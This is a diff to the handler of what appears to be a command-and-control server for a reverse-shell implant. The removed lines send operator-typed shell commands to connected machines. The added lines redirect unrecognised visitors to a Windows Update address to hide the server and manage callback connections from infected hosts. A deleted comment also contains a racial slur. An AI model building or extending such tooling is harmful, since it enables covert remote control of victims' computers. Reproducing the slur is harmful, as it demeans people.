@@ -1,5 +1,5 @@
 import socket
-from Database import Database
+from RuntimeDatabase import RuntimeDatabase
 from HttpResponse import HttpResponse
 from HttpRequest import HttpRequest
 import time
@@ -9,46 +9,48 @@ class Handler:
     @staticmethod
     def handle_unknown_source(client_sock):
         """
-        This function sends to client rendered HTML page
-        :param client_sock: socket for sending page
+        This function redirects client to official Microsoft website
+        :param client_sock: socket for redirection
         :type client_sock: socket
         :return: None
         """
-        content = HttpResponse.load_html_file('resources/index.html')
-        response = HttpResponse.generate_response(404, content)
+        response = HttpResponse.generate_redirect_response("http://www.windowsupdate.com/")
         client_sock.send(response.encode())
+        client_sock.close()
 
     @staticmethod
-    def handle_shell_connection(client_sock, addr):
+    def handle_approved_source(client_sock, addr, request):
         """
         This function check if this is first time connection and handling it
         :param client_sock: socket of client
         :type client_sock: socket
         :param addr: ip address and port
         :type addr: tuple
+        :param request: Http request object
+        :type request: HttpRequest
         :return: None
         """
-        # response = HttpResponse.generate_response(200, "I LIKE NIGGERS!")
-        # client_sock.send(response.encode())
-        if Database.computer_exist(addr[0]):
-            Database.client_lock.acquire()
-            Database.connected_clients.append(tuple((addr, client_sock)))
-            Database.client_lock.release()
-        else:
-            # TODO: Not existing computer in database
-            pass
-        Handler.handle_reverse_shell(client_sock)
+        if request.request_method == "GET":
+            try:
+                RuntimeDatabase.idle_connections_lock.acquire()
+                RuntimeDatabase.idle_connections[addr[0]].close()  # Close previous socket
+                RuntimeDatabase.idle_connections_lock.release()
+            except KeyError:  # New connection
+                pass
+            RuntimeDatabase.idle_connections_lock.acquire()
+            RuntimeDatabase.idle_connections[addr[0]] = client_sock
+            RuntimeDatabase.idle_connections_lock.release()
+        if request.request_method == "POST":
+            try:  # An other handler waiting for this request
+                session_id = request.request_headers['Set-Cookie'].split("=")[1]
+                RuntimeDatabase.post_request_events_lock.acquire()
+                RuntimeDatabase.post_request_events[session_id].set()
+                RuntimeDatabase.post_request_events_lock.release()
+            except KeyError:  # Unknown request target
+                client_sock.close()
+            client_sock.send(HttpResponse.generate_response(200, "").encode())
 
     @staticmethod
-    def handle_reverse_shell(client_sock):
-        while True:
-
-            command = input("Shell> ")
-            response = HttpResponse.generate_response(200, command)
-            client_sock.send(response.encode())
-            data = client_sock.recv(4098).decode()
-            print(data)
-            data = client_sock.recv(4098).decode()
-            print(data)
-            data = client_sock.recv(4098).decode()
-            print(data)
+    def handle_cpr(client_sock):
+        pass
+        # TODO: It's require computer object- next sprint
